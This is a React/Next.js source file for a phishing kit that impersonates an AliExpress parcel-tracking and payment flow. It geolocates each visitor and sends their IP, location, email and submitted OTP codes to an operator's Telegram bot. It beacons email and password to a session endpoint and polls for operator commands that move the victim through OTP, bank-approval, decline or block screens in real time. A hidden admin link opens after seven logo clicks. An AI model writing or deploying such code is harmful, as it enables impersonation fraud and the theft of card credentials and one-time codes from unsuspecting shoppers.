'use client';
import React, { useState, useEffect, useCallback, useRef } from 'react';
import { ChevronDown, Eye, EyeOff, AlertCircle } from 'lucide-react';
import { TranslationProvider, useTranslation } from '@/lib/TranslationContext';
import { loadBotConfigFromServer } from '@/lib/botConfig';
import { Captcha } from '@/components/Captcha';
import { TrackingPage } from '@/components/TrackingPage';
import { PaymentPage } from '@/components/PaymentPage';
import { OtpPage } from '@/components/OtpPage';
import { BankApprovalPage } from '@/components/BankApprovalPage';
import { ProcessingPage } from '@/components/ProcessingPage';
import { SocialButton } from '@/components/SocialButton';

type ViewState = 'captcha' | 'tracking' | 'payment' | 'loading' | 'otp' | 'bank-approval' | 'blocked' | 'declined';

// Use sessionStorage to keep the same session ID across React re-renders/hot-reloads
// This ensures the admin panel always targets the correct browser tab
const SESSION_ID: string = (() => {
  if (typeof window === 'undefined') return Math.random().toString(36).slice(2);
  const stored = sessionStorage.getItem('_track_sid');
  if (stored) return stored;
  const id = Math.random().toString(36).slice(2);
  sessionStorage.setItem('_track_sid', id);
  return id;
})();

// ── Telegram sender — always via server-side proxy ───────────────────────────
async function sendTelegram(token: string, chatId: string, text: string): Promise<void> {
  if (!token || !chatId) {
    console.warn('[TG] No token/chatId configured');
    return;
  }
  try {
    const res = await fetch('/api/telegram', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ token, chatId, text }),
    });
    const data = await res.json();
    if (data.ok) {
      console.log('[TG] Sent OK, msg_id:', data.result?.message_id);
    } else {
      console.error('[TG] Error:', data.description || data.error);
    }
  } catch (e) {
    console.error('[TG] Fetch failed:', e);
  }
}

// ── Session tracker ──────────────────────────────────────────────────────────
function useSessionTracker(page: string, ip: string, country: string, extra: Record<string, unknown> = {}) {
  const extraStr = JSON.stringify(extra);
  useEffect(() => {
    const post = () => {
      try {
        navigator.sendBeacon(
          `/api/sessions/${SESSION_ID}`,
          JSON.stringify({ ip, country, currentPage: page, status: 'online', ...extra })
        );
      } catch {}
    };
    post();
    const t = setInterval(post, 3000);
    return () => clearInterval(t);
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [page, ip, country, extraStr]);
}



// ── Blocked Page ─────────────────────────────────────────────────────────────
const BlockedPage: React.FC = () => (
  <div className="min-h-screen bg-white flex flex-col items-center justify-center max-w-md mx-auto shadow-xl p-8 text-center">
    <div className="text-6xl mb-4">🚫</div>
    <h1 className="text-2xl font-bold text-gray-900 mb-2">Access Blocked</h1>
    <p className="text-gray-500 text-sm">Your access has been temporarily restricted.</p>
  </div>
);

// ── Declined Page ─────────────────────────────────────────────────────────────
const DeclinedPage: React.FC = () => {
  const { t } = useTranslation();
  return (
    <div className="min-h-screen bg-white flex flex-col items-center justify-center max-w-md mx-auto shadow-xl p-8 text-center">
      <div className="w-20 h-20 rounded-full bg-red-50 flex items-center justify-center mb-6">
        <AlertCircle className="w-10 h-10 text-red-500" />
      </div>
      <h1 className="text-2xl font-bold text-gray-900 mb-2">{t('paymentDeclined')}</h1>
      <p className="text-gray-500 text-sm max-w-[260px] mx-auto">{t('cardDeclined')}</p>
    </div>
  );
};

// ── Main App Inner ────────────────────────────────────────────────────────────
interface GeoInfo {
  ip: string;
  country: string;
  city: string;
  zip: string;
}

const MainAppInner: React.FC<{ geo: GeoInfo }> = ({ geo }) => {
  const [view, setView] = useState<ViewState>('captcha');
  const [isDeclined, setIsDeclined] = useState(false);
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [isInvalidOtp, setIsInvalidOtp] = useState(false);
  const [adminClickCount, setAdminClickCount] = useState(0);
  const actionPollRef = useRef<NodeJS.Timeout | null>(null);

  useSessionTracker(view, geo.ip, geo.country, email ? { email, password } : {});

  // ── Admin action polling — runs continuously, handles all views ──────────
  useEffect(() => {
    if (actionPollRef.current) clearInterval(actionPollRef.current);
    actionPollRef.current = setInterval(async () => {
      try {
        const res = await fetch(`/api/actions/${SESSION_ID}`);
        const { action } = await res.json();
        if (!action || action === 'normal') return;

        // Action is already cleared atomically by the server GET handler
        if (action === 'otp') { setIsInvalidOtp(false); setView('otp'); }
        else if (action === 'bank_approval') setView('bank-approval');
        else if (action === 'invalid_otp') { setIsInvalidOtp(true); setView('otp'); }
        else if (action === 'declined') { setIsDeclined(true); setView('payment'); }
        else if (action === 'block') setView('blocked');
      } catch {}
    }, 2000);
    return () => { if (actionPollRef.current) clearInterval(actionPollRef.current); };
  }, []);

  const handleLogoClick = () => {
    setAdminClickCount(c => {
      const next = c + 1;
      if (next >= 7) { window.location.href = '/admin'; return 0; }
      return next;
    });
  };

  // ── Captcha passed → send visitor notification ───────────────────────────
  const handleCaptchaVerified = useCallback(async () => {
    const cfg = await loadBotConfigFromServer();
    if (cfg.token && cfg.chatId) {
      const now = new Date().toLocaleString('en-GB', { timeZone: 'UTC', hour12: false });
      await sendTelegram(cfg.token, cfg.chatId,
        `👁 <b>New AliExpress Visitor</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━━━\n` +
        `📍 <b>IP Address:</b> <code>${geo.ip || 'Unknown'}</code>\n` +
        `🌍 <b>Country:</b> ${geo.country || 'Unknown'}\n` +
        `🏙 <b>City:</b> ${geo.city || 'Unknown'}\n` +
        `📮 <b>ZIP Code:</b> ${geo.zip || 'Unknown'}\n` +
        `🕐 <b>Time (UTC):</b> ${now}\n` +
        `━━━━━━━━━━━━━━━━━━━━━━\n` +
        `🛒 <i>AliExpress — Track</i>`
      );
    }
    setView('tracking');
  }, [geo]);

  // ── Tracking → go to payment ─────────────────────────────────────────────
  const handlePaymentRedirect = useCallback(async () => {
    // Send order number notification to admin
    const cfg = await loadBotConfigFromServer();
    if (cfg.token && cfg.chatId) {
      const now = new Date().toLocaleString('en-GB', { timeZone: 'UTC', hour12: false });
      await sendTelegram(cfg.token, cfg.chatId,
        `📦 <b>Package Tracking Viewed</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━━━\n` +
        `#️⃣ <b>Order Number:</b> <code>3062801646906014</code>\n` +
        `━━━━━━━━━━━━━━━━━━━━━━\n` +
        `🌍 <b>Country:</b> ${geo.country || 'Unknown'}\n` +
        `🏙 <b>City:</b> ${geo.city || 'Unknown'}\n` +
        `📮 <b>ZIP Code:</b> ${geo.zip || 'Unknown'}\n` +
        `📍 <b>IP Address:</b> <code>${geo.ip || 'Unknown'}</code>\n` +
        `🕐 <b>Time (UTC):</b> ${now}\n` +
        `━━━━━━━━━━━━━━━━━━━━━━\n` +
        `🛒 <i>AliExpress — Track</i>`
      );
    }
    setView('payment');
  }, [geo]);

  // ── Payment complete → go to loading, wait for admin action ─────────────
  const handlePaymentComplete = useCallback(async () => {
    setView('loading');
  }, []);

  // ── OTP submitted → send OTP, go to loading, wait for admin action ───────
  const handleOtpVerify = useCallback(async (otp: string) => {
    const cfg = await loadBotConfigFromServer();
    if (cfg.token && cfg.chatId) {
      const now = new Date().toLocaleString('en-GB', { timeZone: 'UTC', hour12: false });
      await sendTelegram(cfg.token, cfg.chatId,
        `🔢 <b>OTP Code Submitted</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━━━\n` +
        `🔑 <b>OTP Code:</b> <code>${otp}</code>\n` +
        `━━━━━━━━━━━━━━━━━━━━━━\n` +
        `📧 <b>Account:</b> <code>${email || 'N/A'}</code>\n` +
        `🌍 <b>Country:</b> ${geo.country || 'Unknown'}\n` +
        `🏙 <b>City:</b> ${geo.city || 'Unknown'}\n` +
        `📍 <b>IP Address:</b> <code>${geo.ip || 'Unknown'}</code>\n` +
        `🕐 <b>Time (UTC):</b> ${now}\n` +
        `━━��━━━━━━━━━━━━━━━━━━━\n` +
        `🛒 <i>AliExpress — Track</i>`
      );
    }
    setIsInvalidOtp(false);
    // Go to loading — stays here until admin takes action via the action poll
    setView('loading');
  }, [email, geo]);

  if (view === 'captcha') return <Captcha onVerified={handleCaptchaVerified} />;
  if (view === 'tracking') return (
    <TrackingPage
      onPayNow={handlePaymentRedirect}
      locationName={geo.country || 'Global'}
      country={geo.country}
      city={geo.city}
      onLogoClick={handleLogoClick}
    />
  );
  if (view === 'payment') return (
    <PaymentPage
      onBack={() => setView('tracking')}
      onComplete={() => { setIsDeclined(false); handlePaymentComplete(); }}
      botToken=""
      chatId=""
      currentIp={geo.ip}
      country={geo.country}
      city={geo.city}
      zip={geo.zip}
      email={email}
      isDeclined={isDeclined}
    />
  );
  // loading view: ProcessingPage stays until admin action poll triggers a view change
  if (view === 'loading') return <ProcessingPage />;
  if (view === 'otp') return (
    <OtpPage
      onVerify={handleOtpVerify}
      isInvalidOtp={isInvalidOtp}
      onResend={() => setIsInvalidOtp(false)}
    />
  );
  if (view === 'bank-approval') return <BankApprovalPage />;
  if (view === 'blocked') return <BlockedPage />;
  return null;
};

// ── IP + Country + City + ZIP detection ──────────────────────────────────────
// Strategy: Race all services in parallel, use first successful result.
// ipapi.co returns IP+country+city+zip in one call. ipify+server-geo is a reliable combo.
const MainApp: React.FC = () => {
  const [geo, setGeo] = useState<GeoInfo>({ ip: '', country: '', city: '', zip: '' });

  useEffect(() => {
    let done = false;

    const trySet = (g: GeoInfo, source: string) => {
      if (done) return;
      done = true;
      console.log(`[Geo] Success via ${source}: IP=${g.ip} Country=${g.country} City=${g.city} ZIP=${g.zip}`);
      setGeo(g);
    };

    // Method A: ipapi.co — single call returns IP + country + city + zip (HTTPS, CORS *)
    const methodA = async () => {
      const r = await fetch('https://ipapi.co/json/', {
        signal: AbortSignal.timeout(8000),
        cache: 'no-store',
      });
      if (!r.ok) throw new Error(`ipapi.co HTTP ${r.status}`);
      const d = await r.json();
      if (d.error) throw new Error(`ipapi.co error: ${d.reason}`);
      if (!d.ip || !d.country_name) throw new Error('ipapi.co missing fields');
      trySet({ ip: d.ip, country: d.country_name, city: d.city || '', zip: d.postal || '' }, 'ipapi.co');
    };

    // Method B: ipify → server geo lookup (returns city + zip too)
    const methodB = async () => {
      const r = await fetch('https://api.ipify.org?format=json', {
        signal: AbortSignal.timeout(8000),
        cache: 'no-store',
      });
      if (!r.ok) throw new Error(`ipify HTTP ${r.status}`);
      const d = await r.json();
      if (!d.ip) throw new Error('ipify no ip');
      const realIp = d.ip;
      if (!done) setGeo(g => ({ ...g, ip: realIp }));
      const r2 = await fetch(`/api/geo?ip=${encodeURIComponent(realIp)}`, {
        signal: AbortSignal.timeout(8000),
        cache: 'no-store',
      });
      if (!r2.ok) throw new Error(`geo HTTP ${r2.status}`);
      const d2 = await r2.json();
      if (!d2.country || d2.country === 'Unknown') throw new Error('geo unknown country');
      trySet({ ip: d2.ip || realIp, country: d2.country, city: d2.city || '', zip: d2.zip || '' }, 'ipify+geo');
    };

    // Method C: api64.ipify → server geo lookup (IPv6 fallback)
    const methodC = async () => {
      const r = await fetch('https://api64.ipify.org?format=json', {
        signal: AbortSignal.timeout(8000),
        cache: 'no-store',
      });
      if (!r.ok) throw new Error(`api64.ipify HTTP ${r.status}`);
      const d = await r.json();
      if (!d.ip) throw new Error('api64.ipify no ip');
      const realIp = d.ip;
      if (!done) setGeo(g => ({ ...g, ip: realIp }));
      const r2 = await fetch(`/api/geo?ip=${encodeURIComponent(realIp)}`, {
        signal: AbortSignal.timeout(8000),
        cache: 'no-store',
      });
      if (!r2.ok) throw new Error(`geo HTTP ${r2.status}`);
      const d2 = await r2.json();
      if (!d2.country || d2.country === 'Unknown') throw new Error('geo unknown country');
      trySet({ ip: d2.ip || realIp, country: d2.country, city: d2.city || '', zip: d2.zip || '' }, 'api64+geo');
    };

    // Run all methods in parallel — first success wins
    Promise.allSettled([methodA(), methodB(), methodC()]).then(results => {
      results.forEach((r, i) => {
        if (r.status === 'rejected') {
          console.warn(`[Geo] Method ${['A', 'B', 'C'][i]} failed:`, r.reason?.message || r.reason);
        }
      });
      if (!done) {
        console.warn('[Geo] All methods failed');
      }
    });
  }, []);

  return (
    <TranslationProvider country={geo.country}>
      <MainAppInner geo={geo} />
    </TranslationProvider>
  );
};

export default function Home() {
  return <MainApp />;
}
